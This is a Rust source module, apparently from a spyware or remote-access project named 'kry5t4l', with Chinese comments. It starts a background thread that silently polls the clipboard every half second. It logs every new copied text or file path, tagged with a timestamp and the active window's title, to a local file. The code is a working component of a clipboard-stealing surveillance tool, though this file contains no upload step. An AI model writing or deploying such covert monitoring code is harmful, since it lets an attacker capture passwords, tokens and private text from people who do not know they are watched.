use arboard::Clipboard;
use clipboard_files::read;
use chrono::Local;
use kry5t4l_share::modules::get_known_folder_path;
use std::fs::{File, OpenOptions};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::thread::sleep;
use std::time::Duration;
use std::hash::{Hash, Hasher};
use active_win_pos_rs::get_active_window;


pub fn start_heartbeat_thread() {

    std::thread::spawn(move || {
        let mut clipboard = Clipboard::new().unwrap();
        
        // 用于跟踪上次内容变化的哈希值（简单比较变化）
        let mut last_text_hash: u64 = 0;
        let mut last_files_hash: u64 = 0;

        //let path = get_known_folder_path(windirs::FolderId::ProgramData, "kry5t4l_clipboard_log");

        let mut log_file = OpenOptions::new()
            .create(true)
            .append(true)
            .open("kry5t4l_clipboard_log")
            .unwrap();

        loop {
            let timestamp = Local::now().format("%Y/%m/%d %H:%M:%S").to_string();

            // 获取当前活动窗口标题
            let window_title = match get_active_window() {
                Ok(active_window) => active_window.title.trim().to_string(),
                Err(_) => "Unknown".to_string(),  // 如果获取失败，默认 "Unknown"
            };

            // 优先检查文本
            if let Ok(text) = clipboard.get_text() {
                let mut hasher = std::collections::hash_map::DefaultHasher::new();
                text.hash(&mut hasher);
                let current_hash = hasher.finish();

                if current_hash != last_text_hash {
                    last_text_hash = current_hash;
                    last_files_hash = 0; // 重置文件哈希，避免冲突
                    let output = format!("[{}] - [{}] - [TEXT]\n{}\n", timestamp, window_title, text.trim());
                    println!("{}", output);
                    let _ = log_file.write_all(output.as_bytes());
                    let _ = log_file.flush();
                }
                sleep(Duration::from_millis(500));
                continue;
            }

            // 如果不是文本，检查文件路径
            if let Ok(files) = read() {
                if !files.is_empty() {
                    let mut hasher = std::collections::hash_map::DefaultHasher::new();
                    for path in &files {
                        path.hash(&mut hasher);
                    }
                    let current_hash = hasher.finish();

                    if current_hash != last_files_hash {
                        last_files_hash = current_hash;
                        last_text_hash = 0; // 重置文本哈希，避免冲突
                        for path in &files {
                            let output = format!("[{}] - [{}] - [FILES]\n{}\n", timestamp, window_title, path.display());
                            println!("{}", output);
                            let _ = log_file.write_all(output.as_bytes());
                            let _ = log_file.flush();
                        }
                    }
                }
            }

            sleep(Duration::from_millis(500));
        }
    });

}
